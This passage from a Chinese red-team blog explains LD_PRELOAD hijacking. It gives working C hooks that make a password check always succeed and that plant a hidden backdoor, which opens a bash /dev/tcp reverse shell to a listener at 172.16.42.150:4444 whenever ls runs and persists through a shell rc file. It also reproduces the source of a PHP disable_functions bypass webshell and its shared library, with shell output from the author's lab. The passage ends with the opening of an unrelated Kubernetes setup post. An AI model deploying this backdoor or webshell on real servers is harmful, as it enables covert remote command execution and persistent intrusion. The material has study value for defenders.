<li><p>永久写入（一般不用这种方式）</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;./hook_strcmp.so&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>ld.so.preload</span><br></pre></td></tr></table></figure></li>
</ol>
<p>我们这里使用第一种方式</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@vuln /tmp]<span class="comment"># LD_PRELOAD=$PWD/hook_strcmp.so ./passcheck password</span></span><br><span class="line">Password Correct!</span><br><span class="line">[root@vuln /tmp]<span class="comment"># LD_PRELOAD=$PWD/hook_strcmp.so ./passcheck a</span></span><br><span class="line">Password Correct!</span><br></pre></td></tr></table></figure>

<p>发现无论输入什么密码都是正确的。</p>
<h2 id="4-制作后门"><a href="#4-制作后门" class="headerlink" title="4. 制作后门"></a>4. 制作后门</h2><p>当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 <code>ls</code> 命令为例进行演示。</p>
<p>首先查看 <code>ls</code> 这一系统命令会调用哪些库函数：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">readelf -Ws <span class="regexp">/usr/</span>bin/ls</span><br></pre></td></tr></table></figure>

<p>选择的是 strncmp 进行Hook</p>
<ul>
<li>hook_strncmp.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@vuln /tmp]# <span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=<span class="variable">$PWD</span>/hook_strncmp.so</span><br><span class="line">[root@vuln /tmp]# ls</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) 组=0(root)</span><br><span class="line">hook_strcmp.c  hook_strcmp.so  hook_strncmp.c  hook_strncmp.so  passcheck  passcheck.c</span><br><span class="line">[root@vuln /tmp]#</span><br></pre></td></tr></table></figure>

<p>利用这种思路，我们可以制作一个隐藏得 Linux 后门，比如当管理员执行 <code>ls</code> 命令时会反弹一个 Shell：</p>
<ul>
<li>hook_strncmp.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.42.150/4444 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>

<p>然后在 <code>.bashrc</code> 中写入，我这里用的是zsh，所以写入了.zshrc：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=/tmp/hook_strncmp.so</span><br></pre></td></tr></table></figure>

<p>执行ls成功收到了shell</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="string">[root@debian ~]</span># nc -lvvp <span class="number">4444</span></span><br><span class="line">listening on <span class="string">[any]</span> <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16.42.151</span>: inverse host lookup failed: Unknown host</span><br><span class="line">connect to <span class="string">[172.16.42.150]</span> from (UNKNOWN) <span class="string">[172.16.42.151]</span> <span class="number">4124</span></span><br></pre></td></tr></table></figure>

<p>这种方式，会影响系统运行，我在执行vim后就会卡顿。</p>
<h2 id="5-绕过-Disable-Functions"><a href="#5-绕过-Disable-Functions" class="headerlink" title="5. 绕过 Disable_Functions"></a>5. 绕过 Disable_Functions</h2><p>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
<p>基于LD_PRELOAD 劫持系统函数这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成以下几个步骤：</p>
<blockquote>
<p> 找到启动新进程的php函数—&gt;找到php函数调用的库函数—&gt;用LD_PRELOAD劫持库函数的调用</p>
</blockquote>
<h3 id="5-1-启动新进程的php函数"><a href="#5-1-启动新进程的php函数" class="headerlink" title="5.1 启动新进程的php函数"></a>5.1 启动新进程的php函数</h3><p>找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 为我提供了劫持系统函数的能力，但前提是我得控制 php 启动外部程序才行（只要有进程启动行为即可，无所谓是谁）。常见的 system() 启动程序方式显然不行，否则就不存在突破 disable_functions 一事了。尝试一些可能启动进程的函数</p>
<ul>
<li>尝试<code>Imagick()</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@vuln html]<span class="comment"># touch image.php</span></span><br><span class="line">[root@vuln html]<span class="comment"># vim image.php</span></span><br><span class="line">[root@vuln html]<span class="comment"># cat image.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$img</span> = <span class="keyword">new</span> Imagick();</span><br><span class="line">	<span class="variable">$img</span> -&gt; newImage(<span class="number">500</span>,<span class="number">300</span>,<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">[root@vuln html]<span class="comment">#  strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve</span></span><br><span class="line">execve(<span class="string">&quot;/usr/bin/php&quot;</span>, [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;image.php&quot;</span>], <span class="number">0x7ffdce692b00</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">brk(<span class="literal">NULL</span>)                               = <span class="number">0x55ce347f1000</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -<span class="number">1</span> ENOENT (没有那个文件或目录)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一个 execve 是启动 PHP 解释器而已，必须找到第二个 execve，没有则说明并未启动新进程</p>
<ul>
<li>尝试<code>mail()</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mail(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">[root@vuln html]# strace -f php mail.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -<span class="symbol">A2</span> -<span class="symbol">B2</span> execve</span><br><span class="line">execve(<span class="string">&quot;/usr/bin/php&quot;</span>, [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;mail.php&quot;</span>], <span class="number">0x7ffcf2ce70f0</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">brk(<span class="symbol">NULL</span>)                               = <span class="number">0x561cadfcf000</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="symbol">R_OK</span>)      = <span class="number">-1</span> <span class="symbol">ENOENT</span> (没有那个文件或目录)</span><br><span class="line">--</span><br><span class="line">[pid <span class="number">19699</span>] set_robust_list(<span class="number">0x7f039d1d2e60</span>, <span class="number">24</span>) = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19699</span>] dup2(<span class="number">3</span>, <span class="number">0</span>)                  = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19699</span>] execve(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/usr/sbin/sendmail -t -i d&quot;</span>], <span class="number">0x561cadfe0e70</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19699</span>] brk(<span class="symbol">NULL</span>)                   = <span class="number">0x562b89290000</span></span><br><span class="line">[pid <span class="number">19699</span>] access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="symbol">R_OK</span>) = <span class="number">-1</span> <span class="symbol">ENOENT</span> (没有那个文件或目录)</span><br><span class="line">--</span><br><span class="line">[pid <span class="number">19699</span>] wait4(<span class="number">-1</span>, strace: <span class="symbol">Process</span> <span class="number">19700</span> attached</span><br><span class="line"> &lt;unfinished ...&gt;</span><br><span class="line">[pid <span class="number">19700</span>] execve(<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="string">&quot;d&quot;</span>], <span class="number">0x562b89290908</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19700</span>] access(<span class="string">&quot;/etc/suid-debug&quot;</span>, <span class="symbol">F_OK</span>) = <span class="number">-1</span> <span class="symbol">ENOENT</span> (没有那个文件或目录)</span><br><span class="line">[pid <span class="number">19700</span>] brk(<span class="symbol">NULL</span>)                   = <span class="number">0x560c224de000</span></span><br></pre></td></tr></table></figure>

<p>mail() 内部启动了 /usr/sbin/sendmail进程，至此我们已经发现了启动新进程的php函数。</p>
<h3 id="5-2-找到php函数调用的库函数"><a href="#5-2-找到php函数调用的库函数" class="headerlink" title="5.2 找到php函数调用的库函数"></a>5.2 找到php函数调用的库函数</h3><p><code>readelf -Ws /usr/sbin/sendmail</code>查看调用哪些库函数</p>
<p>择劫持那些无参数且常用的系统函数，getuid() 就适合</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln html]# readelf -Ws <span class="regexp">/usr/</span>sbin/sendmail | <span class="keyword">grep</span> getuid</span><br><span class="line">    <span class="number">64</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL <span class="keyword">DEFAULT</span>  UND getuid@GLIBC_2.<span class="number">2.5</span> (<span class="number">2</span>)</span><br><span class="line">You have <span class="keyword">new</span> mail.</span><br></pre></td></tr></table></figure>

<p>查看用法</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">man</span> <span class="number">2</span> getuid</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">uid_t</span> <span class="title">geteuid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>劫持代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.42.150/4444 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="5-3-用LD-PRELOAD劫持库函数的调用"><a href="#5-3-用LD-PRELOAD劫持库函数的调用" class="headerlink" title="5.3 用LD_PRELOAD劫持库函数的调用"></a>5.3 用LD_PRELOAD劫持库函数的调用</h3><p>执行命令编译生成 hook_getuid.so：</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@vuln html]<span class="comment"># touch hook_getuid.so</span></span><br><span class="line">[root@vuln html]<span class="comment"># rm hook_getuid.so</span></span><br><span class="line">[root@vuln html]<span class="comment"># touch hook_getuid.c</span></span><br><span class="line">[root@vuln html]<span class="comment"># vim hook_getuid.c</span></span><br><span class="line">[root@vuln html]<span class="comment"># gcc -shared -fPIC hook_getuid.c -o hook_getuid.so</span></span><br></pre></td></tr></table></figure>

<p>然后在 PHP 环境下劫持系统函数 getuid 就行了，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/hook_getuid.so&quot;</span>);</span><br><span class="line">    mail(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问触发</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS <span class="regexp">/tmp]$ curl http:/</span><span class="regexp">/172.16.42.151/m</span>ail.php</span><br></pre></td></tr></table></figure>

<p>收到shell</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@debian</span> ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">listening on [any] <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16</span>.<span class="number">42.151</span>: inverse host lookup <span class="symbol">failed:</span> Unknown host</span><br><span class="line">connect to [<span class="number">172.16</span>.<span class="number">42.150</span>] from (UNKNOWN) [<span class="number">172.16</span>.<span class="number">42.151</span>] <span class="number">41994</span></span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">16416</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@vuln</span><span class="symbol">:/var/www/html</span>$</span><br></pre></td></tr></table></figure>



<p><strong>error_log()</strong></p>
<p><code>error_log</code> 与 <code>mail</code> 函数的原理一样，都会启动一个新的系统进程 <code>/usr/sbin/sendmail</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="comment">// 注意这里的目录要有访问权限</span></span><br><span class="line">error_log(<span class="string">&quot;&quot;</span>, <span class="number">1</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不再赘述。</p>
<h3 id="5-4-利用-LD-PRELOAD-劫持系统新进程来绕过"><a href="#5-4-利用-LD-PRELOAD-劫持系统新进程来绕过" class="headerlink" title="5.4 利用 LD_PRELOAD 劫持系统新进程来绕过"></a>5.4 利用 LD_PRELOAD 劫持系统新进程来绕过</h3><p>在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1   lamp、lamp.、lamp.com）。基于这两个原因，我不得不放弃劫持函数 getuid()，必须找个更普适的方法。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！几经搜索后了解到，GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor)) 修饰的函数。</p>
<p>如下，我们可以直接劫持系统命令 <code>ls</code>：</p>
<ul>
<li>hook_ls.c</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并测试 <code>ls</code> 命令：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># touch hook_ls.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># vim hook_ls.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># gcc -shared -fPIC hook_ls.c -o hook_ls.so</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># LD_PRELOAD=/tmp/hook_ls.so ls</span></span><br><span class="line">uid=0<span class="params">(root)</span> gid=0<span class="params">(root)</span> 组=0<span class="params">(root)</span></span><br><span class="line">hook_<span class="keyword">ls</span>.c   hook_strcmp.c   hook_strncmp.c   passcheck    systemd-private-a83e169502574670adf290d48faa3b1e-apache2.service-0ngAZl</span><br><span class="line">hook_<span class="keyword">ls</span>.so  hook_strcmp.so  hook_strncmp.so  passcheck.c</span><br></pre></td></tr></table></figure>

<p>如上图，成功劫持，并且不光劫持了 <code>ls</code>，只要启动了进程便会进行劫持。</p>
<p><a href="https://github.com/yangyangwithgnu">yangyangwithgnu</a> 师傅根据这个思路创建了 <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">bypass_disablefunc_via_LD_PRELOAD </a>这个项目，项目中有这几个关键文件：</p>
<ul>
<li>bypass_disablefunc.php：一个用来执行命令的 webshell。</li>
<li>bypass_disablefunc_x64.so 或 bypass_disablefunc_x86.so：用来加载并执行命令的动态链接库文件，分为 64 位的和 32 位的。</li>
<li>bypass_disablefunc.c：用来编译生成上面的动态链接库文件。</li>
</ul>
<p>bypass_disablefunc.c的源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bypass_disablefunc.php 的源码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    // 通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">	// error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对于 bypass_disablefunc.php，权限上传到 Web 目录的直接访问，无权限的话可以传到 tmp 目录后用include 等函数来包含，并且需要用 GET 方法提供三个参数：</p>
<p>且需要用 GET 方法提供三个参数：</p>
<ul>
<li>cmd 参数：待执行的系统命令，如 id 命令。</li>
<li>outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。</li>
<li>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</li>
</ul>
<p>可以看到，bypass_disablefunc.php 的源码也使用了 mail() 函数，但是无需安装 sendmail，只需要 PHP 支持 putenv()、mail() 即可。如果 mail() 函数也被禁用了，那我们可以在寻找其他可以启动新进程的函数即可，比如 error_log() 等。</p>
<p>使用时，我们想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标<strong>有权限</strong>的目录中：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@vuln html</span>]<span class="meta"># pwd</span></span><br><span class="line">/<span class="keyword">var</span>/www/html</span><br><span class="line">[<span class="meta">root@vuln html</span>]<span class="meta"># ls</span></span><br><span class="line">bypass_disablefunc.php  bypass_disablefunc_x64.so</span><br><span class="line">[<span class="meta">root@vuln html</span>]<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数：</p>
<p>浏览器访问:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16</span>.<span class="number">42.151</span><span class="regexp">/bypass_disablefunc.php?cmd=ls&amp;outpath=/</span>var<span class="regexp">/tmp/</span>xxxx&amp;sopath=<span class="regexp">/var/</span>www<span class="regexp">/html/</span>bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/ld_preload.jpg"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
<p><a href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/</a></p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>Linux安全</tag>
        <tag>红队技术</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s环境构建</title>
    <url>/Kubernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<p>不尚贤，使民不争；不贵难得之货，使民不为盗；不见可欲，使民心不乱。是以圣人之治。</p>
</blockquote>
<p>k8s环境搭建</p>
<span id="more"></span>

<h2 id="1-下载CentOS镜像"><a href="#1-下载CentOS镜像" class="headerlink" title="1. 下载CentOS镜像"></a>1. 下载CentOS镜像</h2><ul>
<li>访问：<a href="https://mirrors.ustc.edu.cn/">https://mirrors.ustc.edu.cn/</a></li>
<li>点击右侧获取安装镜像，选择centos7 x86_64 Minimal</li>
<li>vmware安装镜像</li>
</ul>
<p>按照初始环境搭建安装三个虚拟机</p>
<ul>
<li><p>环境要求</p>
<ul>
<li>每台机器 2 GB 或更多的 RAM</li>
<li>2 CPU 核或更多（master节点即可）</li>
<li>集群中的所有机器的网络彼此均能相互连接</li>
